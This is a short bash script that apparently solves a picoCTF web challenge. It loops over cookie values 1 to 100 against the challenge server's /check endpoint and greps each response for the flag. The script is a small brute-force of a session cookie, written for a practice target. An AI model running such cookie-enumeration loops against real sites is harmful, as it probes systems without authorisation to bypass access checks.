#!/bin/bash

for i in {1..100}; do
	curl http://mercury.picoctf.net:17781/check -b "name=${i}" | grep -e "picoCTF{.*}"
	if [ $? = 0 ]; then
		break
	fi
done
